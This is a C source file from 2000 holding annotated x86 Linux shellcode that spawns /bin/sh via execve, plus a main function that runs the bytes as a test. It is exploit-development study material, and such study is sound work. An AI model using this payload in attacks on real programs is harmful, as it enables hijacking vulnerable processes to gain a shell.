/* 
 * shellcode-orig-linux-x86.c
 * Created: Mon Apr 24 19:54:01 2000 by tek@wiw.org
 * Revised: Mon Apr 24 19:54:01 2000 (pending)
 * Copyright 2000 Julian E. C. Squires (tek@wiw.org)
 * This program comes with ABSOLUTELY NO WARRANTY.
 * $Id$
 * 
 */

unsigned char shellcode[] = {
    0x55,                               /* push %ebp */

    0x8B, 0xEC,                         /* mov %esp, %ebp */

    0x81, 0xEC, 0x16, 0x00, 0x00, 0x00, /* sub $0x16, %esp */

    /* movl $0x0, (%ebp) */
    0xC7, 0x85, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    0x89, 0xAD, 0xFC, 0xFF, 0xFF, 0xFF, /* movl %ebp, -4(%ebp) */

    /* subl $0x8, -4(%ebp) */
    0x81, 0xAD, 0xFC, 0xFF, 0xFF, 0xFF, 0x08, 0x00, 0x00, 0x00,

    /* movl $0x6E69622F, -12(%ebp) */
    0xC7, 0x85, 0xF4, 0xFF, 0xFF, 0xFF, '/', 'b', 'i', 'n',

    /* movl $0x0068732F, -8(%ebp) */
    0xC7, 0x85, 0xF8, 0xFF, 0xFF, 0xFF, '/', 's', 'h', 0x00,

    0xB8, 0x0B, 0x00, 0x00, 0x00,       /* movl $0xb, %eax */

    0x8D, 0x9D, 0xF4, 0xFF, 0xFF, 0xFF, /* leal -12(%ebp), %ebx */

    0x8D, 0x8D, 0xFC, 0xFF, 0xFF, 0xFF, /* leal -4(%ebp), %ecx */

    0x8D, 0x95, 0x00, 0x00, 0x00, 0x00, /* leal (%ebp), %edx */

    0xCD, 0x80                          /* int $0x80 */
};

int main(void)
{
    (*(void(*)(void))shellcode)();
}

/* EOF shellcode-orig-linux-x86.c */
